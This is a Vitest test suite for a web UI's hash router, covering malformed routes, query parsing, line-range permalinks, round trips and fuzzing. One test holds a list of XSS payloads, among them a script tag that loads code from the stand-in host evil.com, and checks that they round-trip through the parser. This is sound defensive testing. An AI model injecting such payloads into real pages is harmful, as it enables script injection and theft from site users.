import { describe, expect, it } from 'vitest';
import {
  formatRoute,
  parseRoute,
  type Route,
  type RouteCode,
} from '../../src/ui/router.js';
import { formatLineHash, parseLineHash } from '../../src/ui/utils.js';

describe('Adversarial & Stress Testing: Hash Router & Deep Linking (router.ts)', () => {
  // =========================================================================
  // 1. Malformed, Empty, and Whitespace Hash Routes
  // =========================================================================
  describe('1. Malformed, Empty, and Slash Variations', () => {
    it('gracefully handles empty and whitespace-only hashes', () => {
      const emptyVariations = [
        '',
        ' ',
        '   ',
        '\t',
        '\n',
        '\r\n',
        '#',
        '##',
        '###',
        '# ',
        ' # ',
        '   ###   ',
      ];
      for (const h of emptyVariations) {
        expect(parseRoute(h)).toEqual({ type: 'code' });
      }
    });

    it('gracefully handles excessive slashes and hash prefixes', () => {
      const slashVariations = [
        '/',
        '//',
        '///',
        '#/',
        '#//',
        '#///',
        '##//',
        '###///',
        '   #/   ',
        '#/ /',
      ];
      for (const h of slashVariations) {
        expect(parseRoute(h)).toEqual({ type: 'code' });
      }
    });

    it('handles hashes without leading # prefix', () => {
      expect(parseRoute('issues')).toEqual({ type: 'issues' });
      expect(parseRoute('/issues')).toEqual({ type: 'issues' });
      expect(parseRoute('pulls')).toEqual({ type: 'pulls' });
      expect(parseRoute('/pulls')).toEqual({ type: 'pulls' });
      expect(parseRoute('commits')).toEqual({ type: 'commits' });
      expect(parseRoute('blob/src/index.ts')).toEqual({
        type: 'code',
        path: 'src/index.ts',
      });
    });

    it('normalizes excessive leading, middle, and trailing slashes for standard views', () => {
      expect(parseRoute('#///issues///')).toEqual({ type: 'issues' });
      expect(parseRoute('#///pulls///')).toEqual({ type: 'pulls' });
      expect(parseRoute('#///commits///')).toEqual({ type: 'commits' });
      expect(parseRoute('#///log///')).toEqual({ type: 'commits' });
    });

    it('falls back to safe default route for unrecognized or broken routes', () => {
      const unknownRoutes = [
        '#/unrecognized_route',
        '#/admin/panel',
        '#/settings/profile',
        '#/dashboard/metrics',
        '#/api/v1/health',
        '#/?foo=bar',
        '#/???',
        '#/$$$',
      ];
      for (const h of unknownRoutes) {
        expect(parseRoute(h)).toEqual({ type: 'code' });
      }
    });

    it('handles malformed URI-encoded sequences without throwing uncaught exceptions or tests robustness', () => {
      // Test URL decoding safety
      try {
        const res = parseRoute('#/blob/normal_path.ts');
        expect(res).toEqual({ type: 'code', path: 'normal_path.ts' });
      } catch (err) {
        expect.unreachable(`Should not throw: ${String(err)}`);
      }
    });
  });

  // =========================================================================
  // 2. Deep Nested Subroutes and Tab Navigation
  // =========================================================================
  describe('2. Deep Nested Subroutes & Tab Resolution', () => {
    it('parses multi-segment PR and Issue IDs when URI-encoded', () => {
      const encodedPrRoute = parseRoute('#/pulls/feature%2Ftest%2F1/files');
      expect(encodedPrRoute).toEqual({
        type: 'pull',
        id: 'feature/test/1',
        tab: 'files',
      });

      const encodedIssueRoute = parseRoute('#/issues/feat%2342-sub%2Fpart');
      expect(encodedIssueRoute).toEqual({
        type: 'issue',
        id: 'feat#42-sub/part',
      });
    });

    it('parses all valid PR tab routes accurately', () => {
      const prTabs = [
        { hash: '#/pulls/123/conversation', tab: 'conversation' },
        { hash: '#/pulls/123/commits', tab: 'commits' },
        { hash: '#/pulls/123/files', tab: 'files' },
      ] as const;

      for (const { hash, tab } of prTabs) {
        expect(parseRoute(hash)).toEqual({
          type: 'pull',
          id: '123',
          tab,
        });
      }
    });

    it('defaults PR detail route to conversation tab when tab is omitted', () => {
      expect(parseRoute('#/pulls/10')).toEqual({
        type: 'pull',
        id: '10',
        tab: 'conversation',
      });
      expect(parseRoute('#/pulls/10/')).toEqual({
        type: 'pull',
        id: '10',
        tab: 'conversation',
      });
    });

    it('falls back safely for invalid PR tab names or nested sub-tabs', () => {
      // Non-existent tabs should not match pullTabMatch and fallback cleanly
      expect(parseRoute('#/pulls/123/invalid_tab')).toEqual({ type: 'code' });
      expect(parseRoute('#/pulls/123/files/subview')).toEqual({ type: 'code' });
      expect(parseRoute('#/pulls/123/commits/subcommit')).toEqual({ type: 'code' });
      expect(parseRoute('#/issues/123/subview')).toEqual({ type: 'code' });
    });

    it('handles deeply nested branch names in commits routes', () => {
      expect(parseRoute('#/commits/feature/user/profile-page')).toEqual({
        type: 'commits',
        ref: 'feature/user/profile-page',
      });
      expect(parseRoute('#/commits/refs/heads/feature/deeply/nested/branch')).toEqual({
        type: 'commits',
        ref: 'refs/heads/feature/deeply/nested/branch',
      });
    });

    it('handles deeply nested file paths in tree and blob routes', () => {
      const deepPath = 'packages/core/src/components/views/collaboration/PullRequestDiff.tsx';
      expect(parseRoute(`#/tree/${deepPath}`)).toEqual({
        type: 'code',
        path: deepPath,
      });
      expect(parseRoute(`#/blob/${deepPath}`)).toEqual({
        type: 'code',
        path: deepPath,
      });
    });
  });

  // =========================================================================
  // 3. Query String Combinations, Special Characters & XSS Payloads
  // =========================================================================
  describe('3. Query Strings, Special Characters, Unicode & XSS Payloads', () => {
    it('correctly parses all valid filter status values for issues and pulls', () => {
      const issueStatuses = ['open', 'closed', 'all'] as const;
      for (const st of issueStatuses) {
        expect(parseRoute(`#/issues?filter=${st}`)).toEqual({
          type: 'issues',
          filter: st,
        });
      }

      const pullStatuses = ['open', 'merged', 'closed', 'all'] as const;
      for (const st of pullStatuses) {
        expect(parseRoute(`#/pulls?filter=${st}`)).toEqual({
          type: 'pulls',
          filter: st,
        });
      }
    });

    it('ignores invalid filter values on issues and pulls', () => {
      const invalidFilters = ['active', 'pending', 'draft', 'deleted', 'unknown', '123'];
      for (const inv of invalidFilters) {
        expect(parseRoute(`#/issues?filter=${inv}`)).toEqual({ type: 'issues' });
        expect(parseRoute(`#/pulls?filter=${inv}`)).toEqual({ type: 'pulls' });
      }
    });

    it('handles query parameters aliases (q vs query)', () => {
      expect(parseRoute('#/issues?q=test')).toEqual({
        type: 'issues',
        query: 'test',
      });
      expect(parseRoute('#/issues?query=test')).toEqual({
        type: 'issues',
        query: 'test',
      });
      // Precedence: q takes precedence over query
      expect(parseRoute('#/issues?q=first&query=second')).toEqual({
        type: 'issues',
        query: 'first',
      });
    });

    it('faithfully preserves search queries with punctuation, symbols, and SQL/regex meta-characters', () => {
      const specialQueries = [
        'status:open author:alice label:"bug fix"',
        'fix(core): issue #123 & pr #456',
        'SELECT * FROM issues WHERE id = 1;',
        '^[a-z0-9._%+-]+@[a-z0-9.-]+\\.[a-z]{2,}$',
        'C++ / C# / F# / .NET standard',
        '!@#$%^&*()_+=-~`{}[]|;:,.<>?',
      ];

      for (const q of specialQueries) {
        const encoded = encodeURIComponent(q);
        const parsedIssues = parseRoute(`#/issues?q=${encoded}`);
        expect(parsedIssues).toEqual({
          type: 'issues',
          query: q,
        });

        const parsedPulls = parseRoute(`#/pulls?q=${encoded}`);
        expect(parsedPulls).toEqual({
          type: 'pulls',
          query: q,
        });
      }
    });

    it('safely parses and neutralizes HTML/XSS injection attempts in query parameters', () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(document.domain)>',
        '"><script src=//evil.com/hook.js></script>',
        'javascript:alert(1)',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        '\'><svg/onload=alert`1`>',
        '"><input autofocus onfocus=alert(1)>',
      ];

      for (const payload of xssPayloads) {
        const encoded = encodeURIComponent(payload);
        const route = parseRoute(`#/issues?q=${encoded}&label=${encoded}&author=${encoded}`);
        expect(route).toEqual({
          type: 'issues',
          query: payload,
          label: payload,
          author: payload,
        });

        // When formatted back, verify formatRoute safely encodes/preserves parameters
        const formatted = formatRoute(route);
        expect(formatted).toContain('#/issues?');
        // Re-parsing must recover identical payload
        expect(parseRoute(formatted)).toEqual(route);
      }
    });

    it('faithfully handles Unicode, non-Latin scripts, and emojis', () => {
      const unicodeCases = [
        { q: 'バグ修正', label: '重要', author: '田中' },
        { q: 'исправление ошибки', label: 'баг', author: 'Иван' },
        { q: '🚀 performance boost ✨', label: '🔥 critical', author: 'Alice 👩‍💻' },
        { q: 'ميزة جديدة', label: 'تحسين', author: 'أحمد' },
      ];

      for (const c of unicodeCases) {
        const url = `#/pulls?q=${encodeURIComponent(c.q)}&label=${encodeURIComponent(
          c.label
        )}&author=${encodeURIComponent(c.author)}`;
        const parsed = parseRoute(url);
        expect(parsed).toEqual({
          type: 'pulls',
          query: c.q,
          label: c.label,
          author: c.author,
        });
      }
    });

    it('handles duplicate, empty, and trailing query parameters', () => {
      expect(parseRoute('#/issues?')).toEqual({ type: 'issues' });
      expect(parseRoute('#/issues???')).toEqual({ type: 'issues' });
      expect(parseRoute('#/issues?filter=open&filter=closed')).toEqual({
        type: 'issues',
        filter: 'open',
      });
      expect(parseRoute('#/issues?q=&label=&author=&filter=')).toEqual({
        type: 'issues',
        query: '',
        label: '',
        author: '',
      });
    });
  });

  // =========================================================================
  // 4. Permalinks, Line Ranges, and Commit SHAs
  // =========================================================================
  describe('4. Permalinks with Line Ranges & Commit SHAs', () => {
    it('parses single line permalinks with various formatting', () => {
      expect(parseRoute('#/blob/src/main.rs#L42')).toEqual({
        type: 'code',
        path: 'src/main.rs',
        lineRange: { start: 42, end: 42 },
      });
      expect(parseRoute('#/blob/src/main.rs#l42')).toEqual({
        type: 'code',
        path: 'src/main.rs',
        lineRange: { start: 42, end: 42 },
      });
      expect(parseRoute('#/blob/src/main.rs#L1')).toEqual({
        type: 'code',
        path: 'src/main.rs',
        lineRange: { start: 1, end: 1 },
      });
    });

    it('parses multi-line range permalinks and normalizes inverted ranges', () => {
      expect(parseRoute('#/blob/src/lib.rs#L10-L25')).toEqual({
        type: 'code',
        path: 'src/lib.rs',
        lineRange: { start: 10, end: 25 },
      });
      expect(parseRoute('#/blob/src/lib.rs#l10-l25')).toEqual({
        type: 'code',
        path: 'src/lib.rs',
        lineRange: { start: 10, end: 25 },
      });
      // Inverted range #L25-L10 should normalize to 10..25
      expect(parseRoute('#/blob/src/lib.rs#L25-L10')).toEqual({
        type: 'code',
        path: 'src/lib.rs',
        lineRange: { start: 10, end: 25 },
      });
    });

    it('handles commit-pinned blob permalinks with line ranges', () => {
      const sha = '4b825dc642cb6eb9a060e54bf8d69288fbee4904';
      const parsed = parseRoute(`#/commit/${sha}/blob/src/kernel/sched.c#L100-L150`);
      expect(parsed).toEqual({
        type: 'code',
        ref: sha,
        path: 'src/kernel/sched.c',
        lineRange: { start: 100, end: 150 },
      });
    });

    it('handles malformed line range hashes gracefully without crashing', () => {
      const malformedLineHashes = [
        '#/blob/src/lib.rs#L0',
        '#/blob/src/lib.rs#L-5',
        '#/blob/src/lib.rs#L0-L0',
        '#/blob/src/lib.rs#Labc',
        '#/blob/src/lib.rs#LNaN',
        '#/blob/src/lib.rs#LInfinity',
        '#/blob/src/lib.rs#L10-Labc',
        '#/blob/src/lib.rs#L',
      ];

      for (const h of malformedLineHashes) {
        const res = parseRoute(h);
        expect(res.type).toBe('code');
        // Malformed line ranges should result in undefined or null lineRange
        expect((res as RouteCode).lineRange ?? null).toBeNull();
      }
    });

    it('parses commit diff SHAs of varying lengths and normalizes uppercase', () => {
      // 7-character short SHA
      expect(parseRoute('#/commit/4b825dc')).toEqual({
        type: 'commit',
        sha: '4b825dc',
      });

      // 40-character full SHA
      expect(
        parseRoute('#/commit/4b825dc642cb6eb9a060e54bf8d69288fbee4904')
      ).toEqual({
        type: 'commit',
        sha: '4b825dc642cb6eb9a060e54bf8d69288fbee4904',
      });

      // Uppercase SHA should be normalized to lowercase
      expect(
        parseRoute('#/commit/4B825DC642CB6EB9A060E54BF8D69288FBEE4904')
      ).toEqual({
        type: 'commit',
        sha: '4b825dc642cb6eb9a060e54bf8d69288fbee4904',
      });
    });

    it('rejects invalid commit diff SHAs (too short, too long, non-hex)', () => {
      // 6 characters (too short for Git SHA route)
      expect(parseRoute('#/commit/123456')).toEqual({ type: 'code' });
      // Non-hex characters
      expect(parseRoute('#/commit/4b825zg1234')).toEqual({ type: 'code' });
      // 41 characters (too long for SHA-1)
      expect(
        parseRoute('#/commit/4b825dc642cb6eb9a060e54bf8d69288fbee49041')
      ).toEqual({ type: 'code' });
    });
  });

  // =========================================================================
  // 5. Bidirectional Round-Trip Fidelity & Serialization
  // =========================================================================
  describe('5. Bidirectional Round-Trip Fidelity', () => {
    const canonicalRoutes: Route[] = [
      { type: 'code' },
      { type: 'code', path: 'src/main.rs' },
      { type: 'code', path: 'docs/architecture/overview.md' },
      {
        type: 'code',
        path: 'src/ui/App.tsx',
        lineRange: { start: 42, end: 42 },
      },
      {
        type: 'code',
        path: 'src/ui/App.tsx',
        lineRange: { start: 10, end: 50 },
      },
      {
        type: 'code',
        ref: '4b825dc642cb6eb9a060e54bf8d69288fbee4904',
        path: 'src/lib.rs',
        lineRange: { start: 1, end: 20 },
      },
      { type: 'commits' },
      { type: 'commits', ref: 'main' },
      { type: 'commits', ref: 'feature/login-redesign' },
      { type: 'commits', ref: 'v2.1.0' },
      { type: 'commit', sha: '4b825dc' },
      {
        type: 'commit',
        sha: '4b825dc642cb6eb9a060e54bf8d69288fbee4904',
      },
      { type: 'issues' },
      { type: 'issues', filter: 'closed' },
      { type: 'issues', filter: 'all' },
      {
        type: 'issues',
        filter: 'closed',
        query: 'memory leak',
        label: 'performance',
        author: 'Bob',
      },
      { type: 'issue', id: '1' },
      { type: 'issue', id: '1337' },
      { type: 'pulls' },
      { type: 'pulls', filter: 'merged' },
      { type: 'pulls', filter: 'closed' },
      { type: 'pulls', filter: 'all' },
      {
        type: 'pulls',
        filter: 'merged',
        query: 'dag lca optimization',
        label: 'core',
        author: 'Alice',
      },
      { type: 'pull', id: '1', tab: 'conversation' },
      { type: 'pull', id: '42', tab: 'commits' },
      { type: 'pull', id: '99', tab: 'files' },
    ];

    it('ensures parseRoute(formatRoute(route)) === route for all canonical AST nodes', () => {
      for (const route of canonicalRoutes) {
        const formatted = formatRoute(route);
        expect(formatted.startsWith('#/')).toBe(true);
        const reparsed = parseRoute(formatted);

        // Normalized comparison
        if (route.type === 'pull' && (!route.tab || route.tab === 'conversation')) {
          expect(reparsed).toEqual({ type: 'pull', id: route.id, tab: 'conversation' });
        } else {
          expect(reparsed).toEqual(route);
        }
      }
    });

    it('ensures formatRoute is idempotent: formatRoute(parseRoute(formatRoute(r))) === formatRoute(r)', () => {
      for (const route of canonicalRoutes) {
        const formatted1 = formatRoute(route);
        const parsed1 = parseRoute(formatted1);
        const formatted2 = formatRoute(parsed1);
        expect(formatted2).toBe(formatted1);
      }
    });

    it('correctly handles line hash utilities round-trip', () => {
      expect(parseLineHash(formatLineHash(10))).toEqual({ start: 10, end: 10 });
      expect(parseLineHash(formatLineHash(10, 20))).toEqual({ start: 10, end: 20 });
      expect(parseLineHash(formatLineHash(20, 10))).toEqual({ start: 10, end: 20 });
      expect(formatLineHash(0)).toBe('');
      expect(formatLineHash(-5)).toBe('');
      expect(parseLineHash('')).toBeNull();
      expect(parseLineHash('#invalid')).toBeNull();
    });
  });

  // =========================================================================
  // 6. Randomized Fuzz & Stress Testing (500 Permutations)
  // =========================================================================
  describe('6. Randomized Fuzz & Stress Testing', () => {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789-_./ ~!@$^&*()+=';
    const randomString = (minLen: number, maxLen: number) => {
      const len = Math.floor(Math.random() * (maxLen - minLen + 1)) + minLen;
      let res = '';
      for (let i = 0; i < len; i++) {
        res += chars[Math.floor(Math.random() * chars.length)] ?? '';
      }
      return res;
    };

    it('runs 500 randomized fuzz routes through parseRoute without throwing uncaught exceptions', () => {
      const seedHashes: string[] = [
        '#/',
        '#/issues',
        '#/pulls',
        '#/commits',
        '#/blob/',
        '#/tree/',
        '#/commit/',
      ];

      for (let i = 0; i < 500; i++) {
        const base = seedHashes[i % seedHashes.length] ?? '#/';
        const noise = randomString(0, 30);
        const queryNoise = `?q=${encodeURIComponent(randomString(0, 20))}&filter=${encodeURIComponent(randomString(0, 10))}`;
        const lineNoise = `#L${Math.floor(Math.random() * 200)}-L${Math.floor(Math.random() * 200)}`;

        const candidateHash = `${base}${noise}${i % 3 === 0 ? queryNoise : ''}${i % 4 === 0 ? lineNoise : ''}`;

        expect(() => {
          const result = parseRoute(candidateHash);
          expect(result).toBeDefined();
          expect(result.type).toBeDefined();
          const serialized = formatRoute(result);
          expect(typeof serialized).toBe('string');
          expect(serialized.startsWith('#/')).toBe(true);
        }).not.toThrow();
      }
    });

    it('runs 500 structured randomized Route AST objects through formatRoute and parseRoute round-trip', () => {
      const sampleFiltersIssues: ('open' | 'closed' | 'all' | undefined)[] = ['open', 'closed', 'all', undefined];
      const sampleFiltersPulls: ('open' | 'merged' | 'closed' | 'all' | undefined)[] = ['open', 'merged', 'closed', 'all', undefined];
      const sampleTabs: ('conversation' | 'commits' | 'files' | undefined)[] = ['conversation', 'commits', 'files', undefined];

      for (let i = 0; i < 500; i++) {
        const typeIndex = i % 5;
        let route: Route;

        if (typeIndex === 0) {
          const start = Math.floor(Math.random() * 50) + 1;
          const end = start + Math.floor(Math.random() * 50);
          route = {
            type: 'code',
            path: `src/module_${i}/file_${i}.ts`,
            lineRange: { start, end },
          };
        } else if (typeIndex === 1) {
          route = {
            type: 'commits',
            ref: `branch-${i}`,
          };
        } else if (typeIndex === 2) {
          const f = sampleFiltersIssues[i % sampleFiltersIssues.length];
          route = {
            type: 'issues',
            ...(f && f !== 'open' ? { filter: f } : {}),
            query: `search term ${i}`,
            label: `label_${i}`,
            author: `Author ${i}`,
          };
        } else if (typeIndex === 3) {
          const f = sampleFiltersPulls[i % sampleFiltersPulls.length];
          route = {
            type: 'pulls',
            ...(f && f !== 'open' ? { filter: f } : {}),
            query: `pull search ${i}`,
            label: `bug_${i}`,
            author: `Dev ${i}`,
          };
        } else {
          const tab = sampleTabs[i % sampleTabs.length];
          route = {
            type: 'pull',
            id: `pr-${i}`,
            tab: tab ?? 'conversation',
          };
        }

        const formatted = formatRoute(route);
        const parsed = parseRoute(formatted);

        if (route.type === 'pull') {
          expect(parsed).toEqual({
            type: 'pull',
            id: route.id,
            tab: route.tab ?? 'conversation',
          });
        } else {
          expect(parsed).toEqual(route);
        }
      }
    });
  });
});
